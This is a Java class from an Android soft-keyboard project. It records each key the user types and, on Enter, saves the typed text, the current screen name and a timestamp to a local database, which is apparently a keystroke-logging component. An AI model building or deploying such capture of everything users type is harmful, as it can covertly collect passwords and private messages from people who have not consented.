package com.exa.android.softkeyboard;


import java.util.Stack;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.format.Time;
import android.util.Log;


public class SalvarTeclas implements CodigosTeclas{


	private Stack<String> teclas;
	private String nomeTela;
	private StringBuilder stringBuilder;
	private CommentsDataSource db;	
	private Context context;	

	SalvarTeclas(Context con){

		teclas = new Stack<String>();
		stringBuilder = new StringBuilder();
		context = con;		

	}

	public StringBuilder dataLog(){

		StringBuilder data = new StringBuilder();
		Time today = new Time(Time.getCurrentTimezone());
		today.setToNow();

		data.append(today.monthDay);
		data.append("/");
		data.append(today.month + 1);
		data.append("/");
		data.append(today.year);
		data.append("  ");
		data.append(today.format("%k:%M:%S"));

		return data;
	}

	public void nomeTela(String n){

		this.nomeTela = n;

	}

	public void empilharTeclas(int keyCodigo, String tecla){


		switch(keyCodigo){

		case DELETE: 

			if(teclas.size() > 0)			 
				teclas.pop();		

			break;

		case ENTER:

			if(teclas.size() > 0){

				for(String e: teclas) 
					stringBuilder.append(e); 
                /*
				Log.e("Tela",nomeTela);
				Log.e("Data",dataLog().toString());
				Log.e("Nome da tela",stringBuilder.toString());		
				*/
				db = new CommentsDataSource(this.context);
				db.open();

				db.createComment(nomeTela, stringBuilder.toString(), dataLog().toString(),0);

				db.close();

				if(stringBuilder.length() > 0 && teclas.size() > 0){
					stringBuilder.delete(0, stringBuilder.length());
					teclas.clear();
				}
			}	 


			break;	 

		default:

			teclas.push(tecla);

			break;

		}






	}


}
